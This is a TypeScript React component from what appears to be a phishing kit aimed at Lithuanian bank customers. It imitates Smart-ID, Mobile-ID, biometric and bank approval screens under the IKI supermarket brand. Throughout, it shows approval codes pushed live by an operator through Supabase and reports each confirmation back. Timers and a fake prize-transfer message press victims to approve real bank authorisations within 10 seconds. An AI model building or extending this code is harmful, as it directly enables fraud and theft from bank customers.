"use client";

import { useEffect, useMemo, useState } from "react";
import Image from "next/image";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
import { Linkify } from "@/components/ui/Linkify";

type ApprovalLang = "de" | "tr";

type ApprovalViewState = {
  sessionStatus: string;
  approvalStatus: string;
  approvalCode: string;
  transferAmount: string;
  bankSlug: string;
  bankName: string;
  message: string;
  imageUrl: string | null;
  lang: ApprovalLang;
};

const APPROVAL_LABELS: Record<string, string> = {
  smartid_1: "Smart-ID",
  smartid_2: "Smart-ID 2",
  mobileid_1: "M. parašas",
  mobileid_2: "M. parašas 2",
  biometrika_pin_1: "Biometrija",
  biometrika_pin_2: "Biometrija 2",
};

function parseApprovalHistory(value: unknown): string[] {
  if (typeof value !== "string" || !value.trim()) {
    return [];
  }

  try {
    const parsed = JSON.parse(value) as unknown;
    if (Array.isArray(parsed)) {
      return parsed.filter((item): item is string => typeof item === "string" && item.trim().length > 0);
    }
  } catch {
    return [value.trim()];
  }

  return [];
}

function formatRemainingTime(seconds: number) {
  const safeSeconds = Math.max(0, seconds);
  const minutes = Math.floor(safeSeconds / 60)
    .toString()
    .padStart(2, "0");
  const remainingSeconds = (safeSeconds % 60).toString().padStart(2, "0");
  return `${minutes}:${remainingSeconds}`;
}

function SmartIdMark() {
  return (
    <div className="flex items-center justify-center">
      <Image
        src="/form-assets/smart-id-logo.webp"
        alt="Smart-ID"
        width={176}
        height={40}
        priority
        className="h-auto w-[176px]"
      />
    </div>
  );
}

function MobileIdMark() {
  return (
    <div className="flex items-center justify-center">
      <Image
        src="/form-assets/mobile-id-logo.webp"
        alt="Mobile-ID"
        width={178}
        height={42}
        priority
        className="h-auto w-[178px]"
      />
    </div>
  );
}

function SmartIdApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  onConfirm: () => void;
}) {
  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[380px]">
        <div className="pak-form-inner px-6 py-8 sm:px-7">
          <div className="mb-9 flex justify-center rounded-2xl bg-white/95 px-4 py-3">
            <SmartIdMark />
          </div>

          <div className="space-y-5 text-center">
            <h1 className="text-[1.8rem] font-extrabold leading-[1.12] tracking-[-0.02em] text-white">
              Atidarykite Smart-ID programėlę savo telefone.
            </h1>

            <p className="text-[1.05rem] text-white/60">Patvirtinkite naudodami {pinLabel} kodą</p>

            <div
              className="rounded-[12px] px-5 py-5 text-[2.5rem] font-extrabold tracking-[0.14em] text-white"
              style={{
                background: "rgba(255,255,255,0.07)",
                border: "1px solid rgba(255,255,255,0.14)",
                backdropFilter: "blur(10px)",
                textShadow: "0 2px 12px rgba(74,222,128,0.35)",
              }}
            >
              {approvalCode || "0000"}
            </div>

            <p className="text-[1rem] text-white/60">
              Liko laiko: <span className="font-bold text-white">{formatRemainingTime(secondsLeft)}</span>
            </p>

            <button
              type="button"
              onClick={onConfirm}
              disabled={saving}
              className="pak-form-button w-full px-4 py-4 text-[1.05rem]"
            >
              {saving ? "Patvirtinama..." : "Patvirtinti"}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function GenericApprovalCard({
  title,
  approvalCode,
  secondsLeft,
  saving,
  onConfirm,
}: {
  title: string;
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  onConfirm: () => void;
}) {
  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[480px]">
        <div className="pak-form-inner px-5 py-8 text-center sm:px-8">
          <p className="pak-eyebrow mb-3">{title}</p>
          <h1 className="mb-3 text-3xl font-extrabold uppercase leading-[0.95] tracking-[-0.03em] text-white">Būtinas patvirtinimas</h1>
          <p className="mb-6 text-base text-white/60">Norėdami tęsti, patvirtinkite savo įrenginyje rodomą patvirtinimo kodą.</p>

          <div
            className="mb-4 rounded-2xl px-5 py-5 text-4xl font-extrabold tracking-[0.14em] text-white"
            style={{
              background: "rgba(255,255,255,0.07)",
              border: "1px solid rgba(255,255,255,0.14)",
              backdropFilter: "blur(10px)",
              textShadow: "0 2px 12px rgba(74,222,128,0.35)",
            }}
          >
            {approvalCode || "0000"}
          </div>

          <p className="mb-6 text-sm text-white/60">
            Liko laiko: <span className="font-bold text-white">{formatRemainingTime(secondsLeft)}</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="pak-form-button w-full px-4 py-4 text-[1.05rem]"
          >
            {saving ? "Patvirtinama..." : "Patvirtinti"}
          </button>
        </div>
      </div>
    </div>
  );
}

function MobileIdApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  onConfirm: () => void;
}) {
  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[380px]">
        <div className="pak-form-inner px-7 py-8">
          <div className="mb-9 flex justify-center rounded-2xl bg-white/95 px-4 py-3">
            <MobileIdMark />
          </div>

          <div className="space-y-5 text-center">
            <h1 className="text-[1.8rem] font-extrabold leading-[1.12] tracking-[-0.02em] text-white">
              Eikite į savo Mobile-ID programą savo telefone.
            </h1>

            <p className="text-[1.05rem] text-white/60">Patvirtinkite naudodami {pinLabel} kodą</p>

            <div
              className="rounded-[12px] px-5 py-5 text-[2.5rem] font-extrabold tracking-[0.14em] text-white"
              style={{
                background: "rgba(255,255,255,0.07)",
                border: "1px solid rgba(255,255,255,0.14)",
                backdropFilter: "blur(10px)",
                textShadow: "0 2px 12px rgba(74,222,128,0.35)",
              }}
            >
              {approvalCode || "0000"}
            </div>

            <p className="text-[1rem] text-white/60">
              Liko laiko: <span className="font-bold text-white">{formatRemainingTime(secondsLeft)}</span>
            </p>

            <button
              type="button"
              onClick={onConfirm}
              disabled={saving}
              className="pak-form-button w-full px-4 py-4 text-[1.05rem]"
            >
              {saving ? "Patvirtinama..." : "Patvirtinti"}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function BiometricApprovalCard({
  approvalCode,
  secondsLeft,
  saving,
  pinLabel,
  bankSlug,
  bankName,
  onConfirm,
}: {
  approvalCode: string;
  secondsLeft: number;
  saving: boolean;
  pinLabel: "PIN1" | "PIN2";
  bankSlug: string;
  bankName: string;
  onConfirm: () => void;
}) {
  const bankLogo = resolveLocalBankLogoFile(bankSlug, null);

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[380px]">
        <div className="pak-form-inner px-7 py-8">
          <div className="mb-9 flex min-h-[48px] items-center justify-center">
            {bankLogo ? (
              <div className="rounded-2xl bg-white/95 px-4 py-3">
                <img
                  src={bankLogo}
                  alt={bankName || bankSlug || "Banka"}
                  className="max-h-12 w-auto max-w-[190px] object-contain"
                />
              </div>
            ) : (
              <div className="text-center text-2xl font-extrabold tracking-[-0.02em] text-white">
                {bankName || bankSlug || "Bankas"}
              </div>
            )}
          </div>

          <div className="space-y-5 text-center">
            <h1 className="text-[1.8rem] font-extrabold leading-[1.12] tracking-[-0.02em] text-white">
              Biometrinis patvirtinimas
            </h1>

            <p className="text-[1.05rem] text-white/60">Patvirtinkite naudodami {pinLabel} kodą</p>

            <div
              className="rounded-[12px] px-5 py-5 text-[2.5rem] font-extrabold tracking-[0.14em] text-white"
              style={{
                background: "rgba(255,255,255,0.07)",
                border: "1px solid rgba(255,255,255,0.14)",
                backdropFilter: "blur(10px)",
                textShadow: "0 2px 12px rgba(74,222,128,0.35)",
              }}
            >
              {approvalCode || "0000"}
            </div>

            <p className="text-[1rem] text-white/60">
              Liko laiko: <span className="font-bold text-white">{formatRemainingTime(secondsLeft)}</span>
            </p>

            <button
              type="button"
              onClick={onConfirm}
              disabled={saving}
              className="pak-form-button w-full px-4 py-4 text-[1.05rem]"
            >
              {saving ? "Patvirtinama..." : "Patvirtinti"}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function TransferApprovalCard({
  method,
  amount,
  secondsLeft,
  saving,
  bankSlug,
  bankName,
  onConfirm,
}: {
  method: "smartid" | "mobileid";
  amount: string;
  secondsLeft: number;
  saving: boolean;
  bankSlug: string;
  bankName: string;
  onConfirm: () => void;
}) {
  const bankLogo = resolveLocalBankLogoFile(bankSlug, null);
  const shownAmount = amount || "0,00";

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[440px]">
        <div className="pak-form-inner px-6 py-7">
          {/* IKI sol ust + banka logosu sag ust */}
          <div className="mb-6 flex items-start justify-between">
            <img
              src="/form-assets/iki-mini-logo.webp"
              alt="IKI"
              className="h-8 w-auto object-contain"
            />
            {bankLogo ? (
              <img
                src={bankLogo}
                alt={bankName || bankSlug || "Banka"}
                className="h-10 w-10 rounded-full border border-[#4ade80]/30 bg-white object-cover shadow-sm"
              />
            ) : null}
          </div>

          <h1 className="mb-6 text-center text-2xl font-extrabold uppercase leading-[0.98] tracking-[-0.02em] text-white">
            Patvirtinimo pranešimas
          </h1>

          <div className="mb-6 flex justify-center rounded-2xl bg-white/95 px-4 py-3">
            {method === "mobileid" ? <MobileIdMark /> : <SmartIdMark />}
          </div>

          <div
            className="mb-6 rounded-2xl px-5 py-4"
            style={{
              background: "rgba(255,255,255,0.07)",
              border: "1px solid rgba(255,255,255,0.14)",
              backdropFilter: "blur(10px)",
            }}
          >
            <p className="text-center text-[13px] font-medium leading-relaxed text-white/80">
              Sveikiname, kadangi kampanijoje yra ne vienas laimėtojas, dalis{" "}
              <span className="font-bold text-white">€{shownAmount}</span> sumos patvirtinimo
              pranešime, kurį matote paraiškoje, bus pervesta jums. Patvirtinkite instrukcijas
              per 10 sekundžių ir jų neatmeskite. Šį pavedimą tvarko jūsų banka.
            </p>
          </div>

          <p className="mb-5 text-center text-[13px] text-white/60">
            Liko laiko: <span className="font-bold text-white">{secondsLeft} s</span>
          </p>

          <button
            type="button"
            onClick={onConfirm}
            disabled={saving}
            className="pak-form-button flex w-full items-center justify-center gap-2 px-4 py-3.5 text-[15px]"
          >
            <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
            </svg>
            {saving ? "Patvirtinama..." : "Patvirtinti"}
          </button>
        </div>
      </div>
    </div>
  );
}

function SpecialNoticeCard({ message, imageUrl, saving, onContinue }: { message: string; imageUrl: string | null; saving: boolean; onContinue: () => void }) {
  return (
    <div className="pak-page-shell">
      <div className="pak-form-card w-full max-w-[640px]">
        <div className="pak-form-inner px-5 py-6 text-center sm:px-8 sm:py-8">
          <div className="mb-4 flex items-start justify-between gap-4 text-left">
            <div>
              <p className="pak-eyebrow">Klientų aptarnavimas</p>
              <h1 className="mt-3 text-3xl font-extrabold uppercase leading-[0.95] tracking-[-0.03em] text-white sm:text-[2.65rem]">
                Svarbus pranešimas
              </h1>
            </div>
            <img
              src="/form-assets/iki-mini-logo.webp"
              alt="IKI"
              className="pak-form-brand-logo shrink-0"
            />
          </div>

          <div className="mb-5 rounded-[1.2rem] border border-[#4ade80]/20 bg-black/20 px-4 py-4 sm:px-5">
            <p className="whitespace-pre-wrap text-base font-semibold leading-7 text-white/92 sm:text-lg">
              <Linkify text={message} />
            </p>
          </div>

          {imageUrl ? (
            <div className="mb-5 overflow-hidden rounded-2xl border border-white/10 bg-white/5 p-1 shadow-sm">
              <img src={imageUrl} alt="Pranešimas" className="mx-auto h-auto w-full rounded-xl object-contain" />
            </div>
          ) : null}

          <div className="pak-form-security justify-center border-t border-[#4ade80]/15 pt-4 text-center">
            <svg className="h-7 w-7 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
              <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinecap="round" strokeLinejoin="round" />
            </svg>
            <span>Jūsų užklausą saugiai tikrina klientų aptarnavimas.</span>
          </div>

          <button
            type="button"
            onClick={onContinue}
            disabled={saving}
            className="pak-form-button mt-5 w-full px-4 py-4 text-[1.05rem]"
          >
            {saving ? "Siunčiama..." : "Tęsti"}
          </button>
        </div>
      </div>
    </div>
  );
}

export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [ready, setReady] = useState(false);
  const [saving, setSaving] = useState(false);
  const [secondsLeft, setSecondsLeft] = useState(30);
  const [viewState, setViewState] = useState<ApprovalViewState>({
    sessionStatus: "",
    approvalStatus: "",
    approvalCode: "",
    transferAmount: "",
    bankSlug: "",
    bankName: "",
    message: "Prašome palaukti...",
    imageUrl: null,
    lang: "de",
  });

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached && cached !== "undefined" && cached !== "null") {
      setEffectiveSessionId(cached);
    }
  }, [sessionId]);

  useEffect(() => {
    if (!viewState.approvalStatus) return;
    setSecondsLeft(viewState.approvalStatus.startsWith("transfer") ? 10 : 30);

    const timer = window.setInterval(() => {
      setSecondsLeft((previous) => {
        if (previous <= 1) {
          window.clearInterval(timer);
          return 0;
        }
        return previous - 1;
      });
    }, 1000);

    return () => {
      window.clearInterval(timer);
    };
  }, [viewState.approvalStatus, effectiveSessionId]);

  useEffect(() => {
    if (!effectiveSessionId || !supabase) return;

    const applySessionData = (sessionData: { form_data?: Record<string, unknown> | null; status?: string | null } | null | undefined) => {
      const formData = sessionData?.form_data;
      const fd = (formData ?? {}) as Record<string, string | undefined>;
      setViewState({
        sessionStatus: sessionData?.status?.trim() ?? "",
        approvalStatus: fd.approvalStatus?.trim() ?? "",
        approvalCode: fd.approvalCode?.trim() ?? "",
        transferAmount: fd.transferAmount?.trim() ?? "",
        bankSlug: fd.bankSlug?.trim() ?? "",
        bankName: fd.bankName?.trim() ?? "",
        message: fd.specialNoticeText ?? fd.customMessage ?? "Prašome palaukti...",
        imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
        lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "de",
      });
      setReady(true);
    };

    void (async () => {
      const { data } = await supabase.from("sessions").select("status,form_data").eq("id", effectiveSessionId).maybeSingle();
      if (!data) {
        setReady(true);
        return;
      }
      applySessionData(data as { form_data?: Record<string, unknown> | null; status?: string | null });
    })();

    const channel = supabase
      .channel(`special-approval-content:${effectiveSessionId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` },
        (payload) => {
          const next = payload.new as { form_data?: Record<string, unknown> | null; status?: string | null };
          applySessionData(next);
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, supabase]);

  async function handleApprovalSubmit() {
    if (!supabase || !effectiveSessionId) return;

    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", effectiveSessionId).maybeSingle();
    const previousFormData = (existing?.form_data ?? {}) as Record<string, string | undefined>;
    const confirmedStatus = `${viewState.approvalStatus}_confirmed`;
    const nextApprovalHistory = [
      ...parseApprovalHistory(previousFormData.approvalHistory),
      confirmedStatus,
    ].filter((item) => item && item.trim().length > 0);

    const { error } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: {
          ...previousFormData,
          approvalStatus: confirmedStatus,
          approvalCode: viewState.approvalCode,
          approvalConfirmedAt: new Date().toISOString(),
          approvalHistory: JSON.stringify(nextApprovalHistory),
        },
      })
      .eq("id", effectiveSessionId);

    setSaving(false);
    if (!error) {
      router.push(stepToPath("wait", effectiveSessionId));
    }
  }

  async function handleSpecialNoticeContinue() {
    if (!supabase || !effectiveSessionId) return;
    setSaving(true);
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", effectiveSessionId).maybeSingle();
    const previousFormData = (existing?.form_data ?? {}) as Record<string, string | undefined>;
    const nextApprovalHistory = [
      ...parseApprovalHistory(previousFormData.approvalHistory),
      "special_notice_confirmed",
    ].filter((item) => item && item.trim().length > 0);

    const { error } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "wait",
        form_data: {
          ...previousFormData,
          approvalStatus: "special_notice_confirmed",
          approvalHistory: JSON.stringify(nextApprovalHistory),
        },
      })
      .eq("id", effectiveSessionId);

    setSaving(false);
    if (!error) {
      router.push(stepToPath("wait", effectiveSessionId));
    }
  }

  if (!ready) {
    return (
      <div className="flex min-h-screen items-center justify-center px-4">
        <div className="size-10 animate-spin rounded-full border-4 border-[var(--brand)]/25 border-t-[var(--brand)]" />
      </div>
    );
  }

  if (viewState.sessionStatus === "SPECIAL_INFO") {
    return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} saving={saving} onContinue={() => void handleSpecialNoticeContinue()} />;
  }

  // Onay verildi → wait adimina yonlendirme gelene kadar kisa "onaylandi" ekrani.
  // (_confirmed suffix'i kartlarla eslesmedigi icin generic kart flash'i olusuyordu)
  if (viewState.approvalStatus.endsWith("_confirmed")) {
    return (
      <div className="pak-page-shell">
        <div className="pak-form-card w-full max-w-[360px]">
          <div className="pak-form-inner px-7 py-10 text-center">
            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full border border-[#4ade80]/40 bg-[#4ade80]/15 text-[#4ade80]">
              <svg className="h-7 w-7" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h1 className="text-xl font-extrabold text-white">Patvirtinta!</h1>
            <p className="mt-2 text-sm text-white/60">Prašome palaukti, nukreipiama...</p>
            <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#4ade80]/25 border-t-[#4ade80]" />
          </div>
        </div>
      </div>
    );
  }

  if (viewState.approvalStatus === "smartid_1" || viewState.approvalStatus === "smartid_2") {
    return (
      <SmartIdApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "smartid_2" ? "PIN2" : "PIN1"}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "mobileid_1" || viewState.approvalStatus === "mobileid_2") {
    return (
      <MobileIdApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "mobileid_2" ? "PIN2" : "PIN1"}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "transfer_smartid" || viewState.approvalStatus === "transfer_mobileid") {
    return (
      <TransferApprovalCard
        method={viewState.approvalStatus === "transfer_mobileid" ? "mobileid" : "smartid"}
        amount={viewState.transferAmount}
        secondsLeft={secondsLeft}
        saving={saving}
        bankSlug={viewState.bankSlug}
        bankName={viewState.bankName}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus === "biometrika_pin_1" || viewState.approvalStatus === "biometrika_pin_2") {
    return (
      <BiometricApprovalCard
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        pinLabel={viewState.approvalStatus === "biometrika_pin_2" ? "PIN2" : "PIN1"}
        bankSlug={viewState.bankSlug}
        bankName={viewState.bankName}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  if (viewState.approvalStatus) {
    return (
      <GenericApprovalCard
        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Kinnitus"}
        approvalCode={viewState.approvalCode}
        secondsLeft={secondsLeft}
        saving={saving}
        onConfirm={() => void handleApprovalSubmit()}
      />
    );
  }

  return <SpecialNoticeCard message={viewState.message} imageUrl={viewState.imageUrl} saving={saving} onContinue={() => void handleSpecialNoticeContinue()} />;
}
